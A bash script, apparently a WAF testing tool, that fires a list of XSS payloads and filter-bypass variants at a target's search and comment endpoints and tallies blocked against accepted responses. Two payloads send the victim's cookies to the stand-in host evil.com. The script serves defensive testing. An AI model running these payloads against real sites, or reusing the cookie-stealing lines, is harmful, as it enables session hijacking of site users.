#!/bin/bash

# XSS Attack Simulation Script
# Usage: ./xss-test.sh <target-url>

TARGET_URL=${1:-"http://localhost:3000"}

echo "🚨 XSS Attack Simulation"
echo "Target: $TARGET_URL"
echo "=================================="

# XSS payloads
xss_payloads=(
    "<script>alert('XSS')</script>"
    "<img src=x onerror=alert('XSS')>"
    "<svg onload=alert('XSS')>"
    "javascript:alert('XSS')"
    "<iframe src=javascript:alert('XSS')></iframe>"
    "<body onload=alert('XSS')>"
    "<input onfocus=alert('XSS') autofocus>"
    "<select onfocus=alert('XSS') autofocus>"
    "<textarea onfocus=alert('XSS') autofocus>"
    "<keygen onfocus=alert('XSS') autofocus>"
    "<video><source onerror=alert('XSS')>"
    "<audio src=x onerror=alert('XSS')>"
    "<details open ontoggle=alert('XSS')>"
    "<marquee onstart=alert('XSS')>"
    "';alert('XSS');//"
    "\";alert('XSS');//"
    "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>"
    "<img src=x onerror=fetch('http://evil.com/steal?data='+btoa(document.cookie))>"
)

echo "Testing XSS vulnerabilities..."
echo "Time: $(date)"

blocked_count=0
successful_count=0

# Test 1: XSS in search parameter
echo -e "\n1. Testing XSS in search endpoint..."
for i in "${!xss_payloads[@]}"; do
    payload="${xss_payloads[$i]}"
    echo "Testing payload $((i+1)): ${payload:0:50}..."
    
    # URL encode the payload
    encoded_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null || echo "$payload")
    
    response=$(curl -s -w "%{http_code}" "$TARGET_URL/search?q=$encoded_payload" --max-time 5)
    http_code="${response: -3}"
    
    case $http_code in
        200)
            echo "✅ EXECUTED: Payload may have executed (HTTP 200)"
            ((successful_count++))
            ;;
        403)
            echo "🚫 BLOCKED: WAF blocked the request (HTTP 403)"
            ((blocked_count++))
            ;;
        400)
            echo "❌ REJECTED: Bad request (HTTP 400)"
            ;;
        *)
            echo "❓ UNKNOWN: HTTP $http_code"
            ;;
    esac
done

# Test 2: XSS in comment submission
echo -e "\n2. Testing XSS in comment endpoint..."
for i in "${!xss_payloads[@]}"; do
    if [ $i -ge 5 ]; then break; fi  # Test only first 5 for comments
    
    payload="${xss_payloads[$i]}"
    echo "Testing comment payload $((i+1)): ${payload:0:50}..."
    
    response=$(curl -s -w "%{http_code}" -X POST "$TARGET_URL/comment" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "comment=$payload" \
        --max-time 5)
    
    http_code="${response: -3}"
    
    case $http_code in
        200)
            echo "✅ STORED: XSS payload may be stored (HTTP 200)"
            ((successful_count++))
            ;;
        403)
            echo "🚫 BLOCKED: WAF blocked the request (HTTP 403)"
            ((blocked_count++))
            ;;
        400)
            echo "❌ REJECTED: Bad request (HTTP 400)"
            ;;
        *)
            echo "❓ UNKNOWN: HTTP $http_code"
            ;;
    esac
done

# Test 3: Advanced XSS techniques
echo -e "\n3. Testing advanced XSS techniques..."

# Event handler XSS
echo "Testing event handler XSS..."
curl -s "$TARGET_URL/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E" > /dev/null
echo "Event handler test completed"

# DOM-based XSS simulation
echo "Testing DOM-based XSS patterns..."
curl -s "$TARGET_URL/search?q=%23%3Cscript%3Ealert%28%27DOM-XSS%27%29%3C%2Fscript%3E" > /dev/null
echo "DOM-based test completed"

# Filter bypass attempts
echo "Testing filter bypass techniques..."
filter_bypasses=(
    "<ScRiPt>alert('XSS')</ScRiPt>"
    "<script>alert(String.fromCharCode(88,83,83))</script>"
    "<img src=\"javascript:alert('XSS')\">"
    "<svg/onload=alert('XSS')>"
    "<iframe srcdoc=\"<script>alert('XSS')</script>\"></iframe>"
)

for bypass in "${filter_bypasses[@]}"; do
    encoded_bypass=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$bypass'))" 2>/dev/null || echo "$bypass")
    response=$(curl -s -w "%{http_code}" "$TARGET_URL/search?q=$encoded_bypass" --max-time 5)
    http_code="${response: -3}"
    
    if [ "$http_code" = "403" ]; then
        ((blocked_count++))
    elif [ "$http_code" = "200" ]; then
        ((successful_count++))
    fi
done

echo -e "\n=================================="
echo "XSS Attack Summary:"
echo "Total payloads tested: $((${#xss_payloads[@]} + ${#filter_bypasses[@]}))"
echo "Successful executions: $successful_count"
echo "Blocked by WAF: $blocked_count"
echo "Completion time: $(date)"

if [ $blocked_count -gt $successful_count ]; then
    echo -e "\n🛡️  WAF Protection Working!"
    echo "Most XSS attempts were successfully blocked"
else
    echo -e "\n⚠️  XSS Protection Needed"
    echo "Many XSS attempts were not blocked - enable WAF protection"
fi

echo -e "\n💡 Tip: Check the application logs and WAF dashboard for detailed blocking information"
